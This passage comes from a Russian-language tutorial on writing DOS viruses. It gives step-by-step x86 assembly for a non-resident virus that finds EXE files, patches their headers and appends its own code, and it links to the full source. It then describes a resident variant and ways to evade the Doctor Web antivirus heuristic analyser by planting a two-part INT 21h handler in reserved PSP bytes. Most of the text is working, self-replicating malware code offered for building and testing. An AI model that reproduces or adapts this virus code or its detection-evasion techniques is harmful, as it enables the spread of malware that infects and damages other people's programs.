<p>В отличие от COM - вируса,наша запускающая программа после запуска не будет заменять в памяти свои первые три байта командой перехода на функцию DOS завершения программы. По этой причине можно не бояться, что в заражаемый файл попадет испорченный вирусный код (см. п. 1.17 предыдущей части). Отсюда следует, что директива " org 110h" нам не потребуется. Значит,можно сразу переходить "к делу":</p>
<pre class="source">
    vir:       mov ax,cs              ;AX = CS. ..
               db 2dh                 ;SUB AX,00h
    sub_ds     dw 0                   ;
               mov ds,ax              ;
               mov ss,ax              ;

               mov ah,1ah             ;Переключим DTA
	       lea dx,new_dta         ;на соответству-
                                      ;ющий массив в
               int 21h                ;области данных
                                      ;вируса. ..
</pre>
<p>При компиляции относительные адреса всех ячеек памяти определяются относительно DS, который указывает на начало PSP. Но в зараженной программе при передаче управления на код вируса регистр CS будет указывать на параграф, с которого начинается этот код, а не на начало PSP, а регистр DS вообще окажется настроенным на начальный сегмент программы! Единственный способ получить доступ к данным вируса заключается в установке DS = CS.А с учетом размера PSP в 10h параграфов значение DS следует уменьшить как раз на эту величину. При заражении того или иного файла поле " sub_ds " для него будет заполняться значением 10h. Поскольку запускающая программа имеет COM-формат, для нее CS = DS = SS = ES, и все они указывают на начало PSP. Поэтому значение DS корректировать не нужно, и в поле "sub_ds" запускающей программы помещается ноль. Дальше вирус переключает DTA на массив "new_dta", расположенный в области данных вируса. Поскольку начальный сегмент программы станет известным при ее запуске,можно будет без особого труда восстановить адрес исходной DTA.</p>
<h4><a name="p217">1.7 Ищем подходящий файл</a></h4>
<p>Теперь наш вирус может заняться поиском файла-жертвы. Как мы договорились, вирус будет заражать EXE-файлы, значит, такой файл и нужно найти. Но поскольку фрагмент, который производит поиск файлов с тем или иным расширением уже был создан, остается только воспользоваться им, внеся некоторые изменения:</p>
<pre class="source">
               mov ax,old_ip          ;Скопируем исхо-
               mov my_ip,ax           ;дные параметры
               mov ax,old_cs          ;заголовка зара-
               mov my_cs,ax           ;женной програм-
               mov ax,to_16h          ;мы в ячейки па-
               mov my_16h,ax          ;мяти " my_XX ",
               mov ax,old_ss          ;так как ячейки
               mov my_ss,ax           ;" old_XX ", в
               mov ax,old_sp          ;которых хранят-
               mov my_sp,ax           ;ся параметры,
                                      ;будут испорчены
                                      ;при заражении
                                      ;нового файла

    find_first:mov ah,4eh             ;Поиск первого
	       mov cx,00100110b       ;файла :
	       lea dx,maska           ;archive, system
	       int 21h                ;hidden. ..
	       jnc r_3
	       jmp restore_dta

    find_next: mov ah,3eh             ;Закроем  непод-
               mov bx,descrypt        ;ходящий файл
	       int 21h
	       jnc r_2
	       jmp restore_dta

    r_2:       mov ah,4fh             ;Поиск следующе-
	       int 21h                ;го. ..
	       jnc r_3
	       jmp restore_dta

    r_3:       mov cx,12              ;Очистим об-
	       lea si,fn              ;ласть " fn "
    kill_name: mov byte ptr [si],0
	       inc si
	       loop kill_name

               xor si,si              ;И перепишем
    copy_name: mov al,byte ptr new_dta[si + 01eh]
	       cmp al,0               ;туда имя най-
	       je open_file           ;денного файла
	       mov byte ptr fn[si],al
	       inc si
	       jmp copy_name

    open_file: mov ax,3d02h           ;Откроем файл
	       lea dx,fn              ;для чтения и
	       int 21h                ;записи. ..
	       jnc found_size
	       jmp r_2

    found_size:mov descrypt,ax        ;Определим раз-
               mov cx,word ptr [new_dta + 01ch]
               mov dx,word ptr [new_dta + 01ah]
               sub dx,1               ;мер файла и вы-
               sbb cx,0               ;чтем из него
                                      ;единицу . ..
               call setpointer        ;Установим ука-
                                      ;затель на пос-
                                      ;ледний символ

    read_last: mov cx,1               ;Прочитаем
               lea dx,last            ;последний
               call read              ;символ. ..
	       jnc compar
               jmp close_file

    compar:    cmp last,'7'           ;Это "семерка" ?
	       jne mmm                ;Нет
    to_next:   jmp find_next          ;Да ! Файл уже
                                      ;заражен, и надо
                                      ;искать другой
</pre>
<p>Вы, вероятно, уже поняли,что каждая новая программа оставляется нами из ранее разработанных блоков, как из конструктора.Это сильно упрощает работу и сокращает время на составление программ. Было бы странно не воспользоваться готовыми фрагментами и заново преодолевать все трудности! Вместе с тем, использованный фрагмент пришлось несколько модифицировать,чтобы он смог правильно работать в новой программе. Первое внесенное изменение состоит в дублировании исходных значений заголовка программы, из которой стартовал вирус. В комментариях рассказано, зачем это потребовалось. Следующее изменение вызвано тем, что EXE - файл может быть длиннее 64 Кбайт.Поэтому для установки указателя на последний байт файла недостаточно просто вычесть единицу из его размера. Например,пусть длина файла равна 10000h байт. В этом случае из DTA будут считаны такие числа :CX = 0001h и DX = 0000h (см. выше). Теперь для обращения к последнему элементу файла из пары CX : DX следует вычесть "1". Если просто вычесть единицу из DX, то мы получим следующее :CX = 0001h, DX = 0FFFFh, то есть полностью абсурдное значение. Чтобы такого не происходило, нужно применить команду " вычитание с заемом ", которая будет отнимать от CX значение флага переноса CF - " ноль " или " один ". И последнее - вместо непосредственной установки указателя мы будем просто вызывать процедуру "setpointer ", текст которой несложен и рассматривается в конце главы.</p>
<h4><a name="p218">1.8 Читаем заголовок файла</a></h4>
<p>Наш EXE-вирус должен получать управление при старте зараженного файла. С этой целью он может модифицировать заголовок файла,как показано в п. 1.4. Проще всего будет считать заголовок найденной EXE-программы с диска, после чего сделать необходимые изменения и записать его обратно на диск.А так как предыдущий фрагмент вирусной программы уже нашел подходящий EXE - файл, самое время прочитать его заголовок:</p>
<pre class="source">
    mmm:       xor cx,cx              ;Установим ука-
               xor dx,dx              ;затель на нача-
               call setpointer        ;ло файла. ..

               mov ah,3fh             ;И считаем инте-
	       mov bx,descrypt        ;ресующую нас
               mov cx,27              ;часть заголовка
                                      ;в массив " hea-
                                      ;der ". Она как
               lea dx,header          ;раз занимает 27
	       int 21h                ;байт...
               jnc next_step          ;
               jmp restore_dta        ;Ошибка чтения !
</pre>
<p>Работа фрагмента довольно проста и пояснений не требует.</p>
<h4><a name="p219">1.9 Производим необходимые вычисления</a></h4>
<p>Теперь наша задача состоит в следующем: Используя числа, полученные из заголовка и некоторые вспомогательные данные, рассчитать новые параметры заголовка EXE - программы. Напомним, что необходимо найти:</p>
<p>Новые значения CS0, IP0, SS0 и SP0</p>
<p>Новый остаток от деления размера загрузочного модуля на 512</p>
<p>Новый размер файла в 512 - ти байтовых страницах, округленный в большую сторону</p>
<p>Кроме того, следует найти такое значение указателя, которое обеспечило бы запись вирусного кода в конец файла. Это значение будет исходным для процедуры "setpointer", которая предназначена для установки указателя в файле.</p>
<p>Перед началом вычислений вирус должен "запомнить" исходные параметры заголовка, чтобы можно было использовать их для расчета правильной точки входа и переключения стека с области данных вируса на стек зараженной программы при передаче ей управления:</p>
<pre class="source">
                                      ;Запомним пара-
                                      ;метры заголовка
                                      ;в переменных
                                      ;" old_XX ". ..
    next_step: mov ax,word ptr header[14h]
               mov old_ip,ax
               mov ax,word ptr header[16h]
               mov old_cs,ax
               mov ax,word ptr header[0eh]
               mov old_ss,ax
               mov ax,word ptr header[10h]
               mov old_sp,ax
</pre>
<p>После этого можно приступить к вычислениям. Но сначала следует привести принятые для расчета формулы. Обозначим:</p>
<pre class="source">
    Остаток от деления размера загрузочного модуля  на
    512 - Исходный : при вычислениях не используется
          Вычисленный в результате коррекции ( в даль-
          нейшем - " вычисленный " ) : Header [02h]

    Размер файла в 512 - ти байтовых страницах -
          Исходный : File_size
          Вычисленный : Header [04h]

    Смещение в параграфах стекового сегмента в  загру-
    зочном модуле -
          Исходное : SS0
          Вычисленное : Header [0eh]

    Смещение в параграфах  кодового сегмента в  загру-
    зочном модуле -
          Исходное : СS0
          Вычисленное : Header [16h]

    Значение указателя стека SP при передаче  управле-
    ния программе -
          Исходное : SP0
          Вычисленное : Header [10h]

    Значение указателя команд IP при передаче управле-
    ния программе -
          Исходное : IP0
          Вычисленное : Header [14h]

    Размер заголовка в параграфах -
          Head_size

    Длина вируса в байтах -
          Vir_len

    Старшая часть указателя для записи вируса в  конец
    файла -
          F_seek_high

    Младшая часть указателя -
          F_seek_low. 
</pre>
<p>CS0, IP0, SS0 и SP0 в этих расчетах не используются, но мы сохранили их в выделенных ячейках памяти.</p>
<p>Тогда можно привести такие формулы:</p>
<pre class="source">
    Header [16h] = File_size * 32 - Head_size

    Header [04h] = (File_size * 512 + Vir_len) / 512 -
                   частное от деления + 0,если остаток
                                          равен нулю
                                      + 1,если остаток
                                          не равен ну-
                                          лю

    Header [02h] = (File_size * 512 + Vir_len) / 512 -
                   остаток от деления

    Header [14h] = 0
                   При этом первая исполняемая  коман-
                   да вируса будет находиться по адре-
                   су : CS : 0000h, CS = Header [16h].

    Header [0eh] = Header [16h], чтобы можно было  об-
                   ратиться к стеку вируса,задав в ка-
                   честве SP " расстояние "  от начала
                   вирусного  кода  до последних  слов
                   стека. 

    Header [10h] = смещению к New_stack + 96h, послед-
                   нее  слагаемое  зависит от  размера
                   вирусного стека. 

    F_seek_high  = File_size * 512 ( High )

    F_seek_low   = File_size * 512 ( Low )
</pre>
<p>Все расчеты по приведенным формулам можно выполнить с помощью таких программных строк:</p>
<pre class="source">
               mov ax,word ptr header[04h]
               mov cl,5
               shl ax,cl
               cmp ax,0f000h
               jna good_size
               jmp find_next
    good_size: mov bp,ax
               sub ax,word ptr header[08h]
               mov to_16h,ax          ;Это число запи-
                                      ;шется в Header
                                      ;[16h]
               mov ax,bp
               xor dx,dx
               call mover
               mov f_seek_low,ax
               mov f_seek_high,dx
               cmp dx,word ptr [new_dta + 01ch]
               jl to_next
               ja infect
               cmp ax,word ptr [new_dta + 01ah]
               jl to_next
    infect:    add ax,vir_len
               adc dx,0
               mov bx,512
               div bx
               cmp dx,0
               je round
               inc ax
    round:     mov to_04h,ax          ;Это число запи-
                                      ;шется в Header
                                      ;[04h]

               mov to_02h,dx
               mov word ptr header[02h],dx
               mov ax,to_04h
               mov word ptr header[04h],ax
               mov word ptr header[14h],0
               mov ax,to_16h
               mov word ptr header[16h],ax
               mov word ptr header[0eh],ax
     mov word ptr header[10h],offset ds:new_stack + 96
               mov sub_ds,10h
</pre>
<p>В приведенном тексте широко используются команды:</p>
<dl>
<dt>ADC</dt>
<dd>сложение с переносом. Эта команда определяет сумму задаваемых операндов и прибавляет к ней значение флага переноса CF и</dd>
<dt>SBB</dt>
<dd>вычитание с заемом. Команда определяет разность задаваемых операндов и вычитает из нее значение флага CF.</dd>
</dl>
<p>Такие команды потребовались для того, чтобы можно было учесть переполнения, возникающие при работе с файлами длиннее 64 Кбайт. Заметьте, что при разработке COM - вирусов они не применялись вообще. Процедура " mover " заимствована из книги П. Абеля "Язык ассемблера для IBM PC и программирования" и предназначена для умножения двойного слова CX:DX на 16 методом сдвига.</p>
<p>Хотелось бы сказать о том, как наш вирус определяет, содержит ли файл внутренние оверлеи. Для этого он просто сравнивает размер файла в параграфах, полученный из заголовка по смещению 04h с размером, считанным из DTA.Верным признаком присутствия внутренних оверлеев является следующий факт:</p>
<p>Размер, полученный из DTA больше значения, вычисленного по параметрам заголовка. Заражать " оверлейный " файл по принятому нами алгоритму нельзя, и наш вирус при обнаружении такого файла просто попробует найти другую EXE - программу. Сам алгоритм заражения оверлейных файлов отличается высокой сложностью и ненадежностью и в данном пособии не рассматривается. Стоит заметить, что далеко не все вирусы корректно работают с такими файлами, а многие просто их портят.</p>
<h4><a name="p21a">1.10 Заражаем EXE - программу</a></h4>
<p>После того, как скорректирован заголовок файла, можно его заразить. Напомним, что при заражении вирус должен перезаписать на диск модифицированный заголовок, после чего поместить свой код в конец файла-жертвы:</p>
<pre class="source">
               xor dx,dx              ;Устанавливаем
               xor cx,cx              ;указатель на
               call setpointer        ;начало файла
               jc close_file          ;

               lea dx,header          ;И записываем
               mov cx,27              ;измененный за-
               call write             ;головок на диск
               jc close_file

               mov dx,f_seek_low      ;Устанавливаем
               mov cx,f_seek_high     ;указатель на
               call setpointer        ;определенное
                                      ;ранее место в
                                      ;файле
               jc close_file

               lea dx,vir             ;И записываем на
               mov cx,vir_len         ;диск вирусный
               call write             ;код

    close_file:xor ax,ax              ;Закроем зара-
               mov ah,3eh             ;женный файл
               mov bx,descrypt        ;
               int 21h                ;
</pre>
<p>Строго говоря, код вируса записывается не за последним байтом файла. Это имеет место только когда размер файла кратен 512. Во всех остальных случаях вирусный код помещается в файл по смещению, определяемому размером файла в 512 - ти байтовых страницах. Конечно, число страниц округляется в большую сторону. Например, при размере файла в 1025 байт вирус будет считать, что его длина составляет три полных страницы, а при размере в 4096 байт - всего восемь! Такая система сильно упрощает процесс создания вирусной программы и ее отладку.</p>
<h4><a name="p21b">1.11 Восстанавливаем DTA</a></h4>
<p>Итак, вирус выполнил свою работу - найден и заражен подходящий EXE - файл. Дальше необходимо переключить DTA с области данных вируса на область в PSP программы, из которой он стартовал. Поскольку начальный сегмент программы известен (он хранится в регистре ES, которым мы не пользовались), несложно найти адрес исходной DTA. Он равен ES:80h. И поэтому:</p>
<pre class="source">
    restore_dta:
               push ds                ;DS -> в стек
               mov ah,1ah             ;Восстановим
               mov dx,080h            ;адрес DTA зара-
               mov bp,es              ;женной програм-
               mov ds,bp              ;мы с помощью
               int 21h                ;функции DOS 1Ah
               pop ds                 ;DS &lt;- из стека
</pre>
<p>В этом фрагменте адрес DTA устанавливается с помощью функции DOS 1Ah (см. ПРИЛОЖЕНИЕ 1). Новый адрес должен быть помещен в DS : DX, что мы и сделали. Команда " push ds " записывает в стек содержимое регистра DS, так как этот регистр используется для задания адреса,и поэтому его значение будет испорчено.</p>
<h4><a name="p21c">1.12 Восстанавливаем точку входа</a></h4>
<p>Далее необходимо передать управление зараженной программе ( конечно, не только что зараженной, а той, из которой стартовал вирус ). Для этого нужно восстановить ее исходную точку входа,а также переключить стек с вирусной области данных на стек, предусмотренный разработчиком программы. Чтобы произвести все необходимые вычисления, мы используем параметры заголовка программы, сохраненные ранее в ячейках " my_XX ". При передаче управления на код вируса в регистр CS было помещено такое значение : CS = NS0 + 10h + Header [16h], и это значение нам известно - оно сейчас находится в CS. С другой стороны, настоящая точка входа EXE - программы имеет сегментный адрес CS = NS0 + 10h + my_cs. Таким образом, достаточно узнать, чему равна сумма : NS0 + 10h, и прибавить к ней " my_cs ". Такая же ситуация возникает и при восстановлении регистра SS, только здесь к NS0 + 10h нужно прибавить " my_ss ". Проще всего восстановить регистр DS, поскольку при загрузке EXE-файла соблюдается условие : ES = DS = NS0. Для инициализации SP и IP можно просто записать в них числа, хранящиеся в переменных " my_sp " и " my_ip ", не производя при этом каких - либо сложных расчетов. С учетом этих соображений можно записать:</p>
<pre class="source">
               mov ax,my_ip
               mov old_ip,ax
               mov ax,my_cs
               mov old_cs,ax
               mov ax,my_16h
               mov to_16h,ax
               mov ax,my_sp
               mov sp,ax              ;Инициализируем
                                      ;регистр SP. ..
               mov ax,cs              ;Найдем
               sub ax,to_16h          ;NS0 + 10h. ..
               add my_ss,ax           ;Вычислим SS. ..
               mov ss,my_ss           ;
               add ax,old_cs          ;Вычислим CS. ..
               mov old_cs,ax          ;
               mov ax,es              ;Инициализируем
               mov ds,ax              ;регистр DS. ..

               jmp $ + 2              ;Сбросим очередь
                                      ;процессора
               db 0eah                ;И перейдем к
    old_ip     dw 0                   ;исполнению
    old_cs     dw 0                   ;программы. ..
</pre>
<p>Команда перехода к исполнению программы записана в виде машинного кода,чтобы при необходимости ее можно было модифицировать. И еще - вы , вероятно, помните, что символами "NS0" мы обозначили начальный сегмент программы.</p>
<h4><a name="p21d">1.13 Область данных вируса</a></h4>
<p>Приведем данные, которыми оперирует уже почти созданный нами EXE-вирус:</p>
<pre class="source">
                                      ;Собственная DTA
                                      ;вируса
               new_dta       db   128 dup (0)

                                      ;Маска для поис-
                                      ;ка файла - жер-
                                      ;твы
               maska         db   '*.exe',0

                                      ;Буфер для хра-
                                      ;нения имени
                                      ;найденного
                                      ;файла
               fn            db   12 dup (' '),0

                                      ;Массив для хра-
                                      ;нения заголовка
               header        db   27 dup ( 0 )

               descrypt      dw   0   ;Ячейка для дес-
                                      ;криптора

               to_02h        dw   0   ;Эти ячейки ис-
               to_04h        dw   0   ;пользуются для
               to_16h        dw   0   ;хранения пара-
               my_ip         dw   0   ;метров заголо-
               my_cs         dw   0   ;вка заражаемой
               my_16h        dw   0   ;программы и
               my_ss         dw   0   ;той, из которой
               my_sp         dw   0   ;стартовал
               old_ss        dw   0   ;вирус
               old_sp        dw   0   ;
               f_seek_low    dw   0   ;В эти перемен-
               f_seek_high   dw   0   ;нные записывае-
                                      ;тся значение
                                      ;указателя

                                      ;Вирусный стек
               new_stack     dw   50 dup ( 0 )

               last          db   0   ;Сюда помещается
                                      ;последний байт
                                      ;заражаемого
                                      ;файла

                             db   '7' ;Последний байт
                                      ;вирусного кода
</pre>
<h4><a name="p21e">1.14 Используемые процедуры</a></h4>
<p>Осталось только привести тексты процедур, которыми пользуется вирус, и работа почти закончена. Они выглядят так:</p>
<pre class="source">
    setpointer proc                   ;Процедура уста-
	       mov ax,4200h           ;навливает  ука-
	       mov bx,descrypt        ;затель  в файле
	       int 21h                ;на заданный
               ret                    ;байт. ..
    setpointer endp

    read       proc                   ;Процедура  чте-
               mov ah,3fh             ;ния из файла...
	       mov bx,descrypt
	       int 21h
               ret
    read       endp

    write      proc                   ;Процедура за-
               mov ah,40h             ;писи в файл. ..
               mov bx,descrypt
               int 21h
               ret
    write      endp

    mover      proc                   ;Процедура умно-
               mov cx,04h             ;жения двойного
    left:      shl dx,1               ;слова CX : DX
               shl ax,1               ;на 16 методом
               adc dx,00h             ;сдвига. ..
               loop left              ;
               ret                    ;
    mover      endp
</pre>
<p>Приведенные процедуры очень просты и довольно эффективны. Процедура "mover" , как уже говорилось, взята из книги П. Абеля " Язык ассемблера для IBM PC и программирования ", естественно, без разрешения автора.</p>
<h4><a name="p21f">1.15 Работа завершена</a></h4>
<p>Только что мы разработали вирусную программу, заражающую EXE-файлы. Последний штрих - напишем несколько строк, почти стандартных для всех ассемб лерных программ:</p>
<pre class="source">
                                      ;Длина вирусного
                                      ;кода в байтах
	       vir_len       equ  $-vir

    prg ends
    end vir
</pre>
<h4><a name="p21g">1.16 Полный текст нерезидентного EXE-вируса</a></h4>
<p>Для лучшего понимания всего изложенного в этой главе приведем полный текст написанной нами программы:</p>
<p><a href="files/vik00_ru/exenotsr.asm">Скачать exenotsr.asm 11(Kb)</a></p>
<h4><a name="p21h">1.17 Несколько слов об испытании вируса</a></h4>
<p>В принципе, процесс испытания созданного вируса ничем не отличается от ранее рассмотренного. Обращаю внимание читателей только на одну деталь:</p>
<p>Отладчик AFD_RUS.COM корректно работает только с неупакованными EXE - файлами.Если вы попытаетесь с его помощью отладить EXE - программу, упакованную какой - либо утилитой сжатия (например, DIET, LZ_EXE или PKLITE), то из этого ничего не получится. Конечно, программа не испортится,но результаты работы отладчика будут неверными. Для отладки упакованных программ можно воспользоваться TURBO DEBUGGER фирмы BORLAND INTERNATIONAL, но еще лучше распаковать такую программу и применить отладчик попроще.</p>
<p>Если в программе есть команды,изменяющие SS и SP, то при " прохождении " ее AFD_RUS.COM результаты работы отладчика могут быть совершенно неожиданными. Это происходит потому, что указанный отладчик использует стек исследуемой им программы.</p>
<p>Все только что отмеченные недостатки AFD_шки ни в коей мере не дают сделать вывод,что этот отладчик плохой. Hаоборот,он во многих отношениях значительно превосходит даже TURBO DEBUGGER. Возможностей AFD_RUS вполне достаточно при отладке примерно 95 % программ.</p>
<h3><a name="p22">Глава 2. Разработка резидентного EXE - вируса</a></h3>
<h4><a name="p221">2.1 Алгоритм работы резидентного EXE - вируса</a></h4>
<p>Для начала рассмотрим алгоритм работы резидентного вируса, заражающего EXE-файлы. Он очень похож на соответствующий алгоритм для COM-вируса, поэтому подробно рассматриваться не будет:</p>
<p>Секция инициализации выполняет следующие действия:</p>
<ol>
<li>Получает управление при запуске зараженной программы.</li>
<li>Проверяет, установлена ли в память резидентная часть вируса.</li>
<li>Если резидентная часть не установлена, выполняются следующие действия:
<ol type="a">
<li>Отыскивается свободный блок памяти достаточного для размещения вируса размера.</li>
<li>Код вируса копируется в найденный блок памяти.</li>
<li>В таблице векторов прерываний соответствующие вектора заменяются точками входа в вирусные обработчики.</li>
<li>Определяются значения CS, IP, SS и SP, необходимые для правильной работы программы, из которой стартовал вирус.</li>
<li>Управление передается зараженной программе. Для этого вирус использует команду безусловного дальнего перехода или возврата из дальней процедуры. Адрес перехода задается вычисленными CS и IP. После этого начинается обычное выполнение программы.</li>
</ol>
<p>В том случае, если резидентная часть вируса уже находится в памяти, он просто выполняет действия перечисленные в п.п. "d" и "e".</p></li>
</ol>
<p>Резидентная часть работает по такому "сценарию":</p>
<ol>
<li>Анализирует все вызовы системного прерывания INT 21h с целью выявить переход оператора в новый каталог или смену текущего диска.</li>
<li>Если обнаружится смена текущего диска или каталога, резидентная часть должна:
<ol type="a">
<li>Сохранить исходное состояние вычислительной системы.</li>
<li>Найти на диске подходящий EXE-файл.</li>
<li>Записать вирусный код в конец этого файла.</li>
<li>Скорректировать заголовок файла (см. п.1.4 гл. 1 ч. 2).</li>
<li>Восстановить исходное состояние вычислительной системы и передать ей управление.</li>
</ol></li>
</ol>
<p>Как и в случае с COM - вирусом, заражение файлов выполняет только резидентная часть. Вредные действия можно " возложить " как на резидентную, так и на транзитную часть (на транзитную - проще, а на резидентную - обычно сложнее.).</p>
<h4><a name="p222">2.2 Защита от программ - антивирусов</a></h4>
<p>Честно говоря, эта глава просто является обобщением всех предыдущих. Поэтому все основное уже рассказано. Но есть несколько весьма интересных и заслуживающих вашего внимания вопросов, о которых почти не упоминается в литературе. Речь идет о построении вирусов, " невидимых " для антивирусных программ. В самом деле,один - единственный "обыск" с помощью программы DOCTOR WEB на диске или в памяти может свести все наши усилия к нулю. Поэтому самое время поговорить о способах скрытия вирусом своего наличия в вычислительной системе. Технику защиты вирусной программы от обнаружения мы рассмотрим на примере всем известного антивируса DOCTOR WEB.Именно эта программа является наиболее удачной и используемой. Как вы знаете, для обнаружения неизвестных вирусов DOCTOR WEB использует так называемый эвристический анализатор, моделирующий действия человека, желающего обнаружить новый вирус. Все изложенное ниже базируется на следующем предположении: эвристический анализатор, по существу, представляет собой комбинацию пошагового отладчика и программы, анализирующей результаты его работы. Перейдем к делу. Если вы " заразите " ваш компьютер написанным ранее резидентным COM - вирусом, а потом запустите DOCTOR WEB (режим тестирования памяти должен быть включен), то вирус будет обнаружен как неизвестный резидентный. Кроме того, антивирусная программа определит адрес в памяти, по которому находится вирусный код. Если вы просмотрите содержимое памяти по этому адресу,то увидите, что DOCTOR WEB "ошибся". А именно - по указанному адресу расположен собственно не сам вирус, а только его обработчик прерывания INT 21h.На остальные вирусные обработчики антивирус не обратил внимания. Исходя из этого можно сделать такие выводы:</p>
<ol>
<li>Эвристический анализатор определяет, на какой адрес указывает вектор прерывания INT 21h в таблице векторов.</li>
<li>Далее вступают в действие следующие соображения: Обработчик прерывания INT 21h почти никогда не может находиться в самых младших (например, в области данных BIOS) или в самых старших (например, в последнем сегменте) адресах основной памяти. Поэтому при обнаружении такой ситуации эвристический анализатор считает, что система заражена неизвестным вирусом, и в качестве адреса, по которому расположен его код, выдает адрес обработчика INT 21h.</li>
</ol>
<p>Как видим, все не так уже и сложно. Далее пользователь должен решать сам, действительно ли вирус присутствует в его компьютере. Отметим, что для решения этого вопроса нужно иметь довольно высокую квалификацию, поэтому для подавляющего большинства пользователей задача представляется неразрешимой.</p>
<h4><a name="p223">2.3 Как реализовать защиту от эвристического анализа</a></h4>
<p>Очевидно, вирус не будет найден в памяти, если разместить обработчик INT 21h в той ее части, в которую загружаются пользовательские программы. С другой стороны, наш вирус помещает свой код в самые старшие адреса основной памяти. Единственным выходом из положения было бы написание обработчика, состоящего из двух частей. При этом "первая" часть должна загружаться в область памяти,выделенную для загрузки прикладных программ,а "вторую" - вместе с остальной частью вируса - следует записать в старшие адреса основной памяти. В случае возникновения прерывания INT 21h управление будет передаваться первой части, которая затем передаст его второй. К сожалению, данный метод себя не оправдывает. DOCTOR WEB в процессе эвристического анализа просто трассирует обработчик INT 21h до входа в его исходный (системный) код, одновременно контролируя адрес обработчика, и при получении любых подозрительных результатов выдает сообщение о наличии неизвестного вируса. Поэтому необходимо сделать так, чтобы при трассировании "первой" части под управлением отладчика вызывался системный обработчик, а при "нормальном" трассировании - вирусный (эксперименты показывают,что DOCTOR WEB,вероятнее всего, содержит встроенный отладчик). Для реализации указанного метода можно использовать особенность микропроцессора, состоящую в наличии очереди команд. Однако этот путь по существу является тупиковым, так как вирус, реализующий такой алгоритм,не будет работать на процессорах PENTIUM из-за наличия в последних так называемой системы прогнозирования переходов. Мы же поступим по другому.Как вы знаете все отладчики интенсивно используют прерывание 01h (One Step),обработчик которого останавливает работу микропроцессора после выполнения каждой команды. Поэтому естественно предположить, что для проведения эвристического анализа DOCTOR WEB устанавливает собственный обработчик Int 01h,а значит, заменяет адрес системного обработчика в таблице векторов прерываний.На факт замены этого адреса мы и будем ориентироваться. Экспериментальным путем было установлено, что системный обработчик Int 01h находится в памяти по такому адресу : 0070:XXXX. Следовательно, достаточно проверить сегментный адрес обработчика Int 01h, чтобы сказать, перехвачено-ли это прерывание какой-нибудь прикладной программой. Следующая проблема,возникающая при построении программы обработки прерывания из двух частей, состоит вот в чем: непонятно, куда именно следует поместить "первую" часть, чтобы она не затиралась при загрузке программ и их работе, и не была бы видна с помощью, например, VC.COM или RELEASE. Многочисленными экспериментами было установлено, что для размещения участка обработчика прерывания, ответственного за " обман " эвристического анализатора, можно использовать байты с 38h по 5Ch, принадлежащие PSP первой загруженной в память программы. Эти байты зарезервированы разработчиками операционной системы, вероятно, для будущих ее версий, и их значения остаются постоянными в течение всего сеанса работы компьютера. Кроме того, зарезервированного пространства в PSP вполне хватит для размещения программы обработки прерывания. Итак, можно предложить следующий алгоритм:</p>
<ol>
<li>Отыскивается PSP первой загруженной в память программы.</li>
<li>В байты 38h - 5Ch записывается код "промежуточного" обработчика прерывания INT 21h. Этот код должен вызывать системный обработчик при работе под управлением отладчика и вирусный в противном случае.
<p>* На самом деле можно использовать и другие области PSP, расположенные после байта со смещением 5Ch (примерно 32 байта - без всяких последствий.).</p></li>
<li>В таблице векторов прерываний вектор INT 21h заменяется на точку входа в промежуточный обработчик.</li>
</ol>
<p>Вот, собственно, и все.</p>
<h4><a name="p224">2.4 Реализуем предложенный алгоритм</a></h4>
<p>Как мы договорились,сначала следует найти PSP первой загруженной в память программы. Это можно сделать следующим образом:</p>
<pre class="source">
    find_psp:  push es                ;Найдем первый
               xor di,di              ;PSP в памяти
               xor ax,ax

    to_new_seg:inc ax
               mov es,ax
               cmp ax,0ffffh          ;Этот сегмент -
               jae free_mem           ;последний ?
	       cmp byte ptr es:[di],4dh
                                      ;Это - MCB -
                                      ;блок ?
	       jne to_new_seg         ;Нет !
    to_test:   mov bx,ax              ;Да !
               add bx,es:[di+3]
               inc bx
               mov es,bx
               cmp byte ptr es:[di],4dh
                                      ;Следующий MCB
                                      ;корректен ?
               je  restore_es         ;Да !
               cmp byte ptr es:[di],5ah
               jne to_new_seg         ;Нет !
    restore_es:mov es,ax
            cmp word ptr es:[di+1],0  ;MCB свободен ?
               je to_new_seg          ;Да !
               mov bx,es
               inc bx
               cmp es:[di+1],bx
               jne to_new_seg
       cmp byte ptr es:[di+10h],0cdh  ;После MCB сле-
                                      ;дует PSP ?
               jne to_new_seg         ;Нет - тогда он
                                      ;нас не интере-
                                      ;сует. ..
               mov first_psp,es       ;Да - найдена
               mov cx,es              ;нужная нам
               dec es_save            ;область памяти
               cmp es_save,cx         ;А может, мы на-
                                      ;шли свой же
                                      ;PSP ?
               jne add_05h            ;Нет !
               pop es
               jmp fresh_input        ;Да !
    add_05h:   add first_psp,05h
</pre>
<p>Напомним, что PSP располагается в памяти сразу вслед за MCB - блоком,выделенным операционной системой для загрузки программы, а первым байтом PSP должно быть число 0CDh, что и используется в приведенном фрагменте.</p>
<p>Дополнительно следует рассмотреть следующую ситуацию: обычно первым PSP в памяти является PSP командного процессора COMMAND.COM. Но при некоторых конфигурациях операционой системы (например, при использовании WINDOWS 95 в режиме эмуляции MS DOS) это правило иногда не соблюдается. Может случиться так, что первой в файле AUTOEXEC.BAT для загрузки указана нерезидентная EXE - программа, зараженная нашим вирусом.При старте этой программы вирус фактически отыщет ее же PSP и запишет туда текст промежуточного обработчика INT 21h. Далее программа нерезидентно завершится, после чего занимаемая ею память будет использована другими программами, поэтому наш промежуточный обработчик будет затерт, и компьютер обязательно повиснет. Чтобы этого не произошло, вирус проверяет, какой именно PSP был найден первым, и если имела место описанная выше ситуация, отказывается от заражения памяти. В остальном работа фрагмента ясна.</p>
<h4><a name="p225">2.5 Пишем промежуточный обработчик</a></h4>
<p>Теперь следует написать " промежуточный " обработчик прерывания INT 21h,который должен вызывать системный или вирусный обработчики данного прерывания в зависимости от режима работы процессора. Эту задачу можно решить, например, так:</p>
<pre class="source">
    to_bios:   push ax                ;Текст  промежу-
                                      ;точного
               push ds                ;обработчика
                                      ;INT 21h. ..
               pushf
               xor ax,ax
               mov ds,ax
    cmp word ptr ds:[0006h],0070h     ;Int 01h пере-
                                      ;хвачено ?
               jne cs:uuuuu           ;JMP на  систем-
                                      ;ный или вирус-
                                      ;ный обработчики
                                      ;INT 21h. ..
               popf
               pop ds
               pop ax
               db 0eah                ;На вирусный. ..
    our_21h_ip dw to_new_21h
    our_21h_cs dw 00h
    uuuuu:     popf
               pop ds
               pop ax
               db 0eah                ;На системный...
    sys_21h_ip dw 00h
    sys_21h_cs dw 00h

    code_len equ $ - to_bios          ;Длина обработ-
                                      ;чика
</pre>
<p>Данный фрагмент написан настолько просто, что никаких пояснений по поводу его работы не требуется.</p>
<h4><a name="p226">2.6 Защита от обнаружения вируса в файле</a></h4>
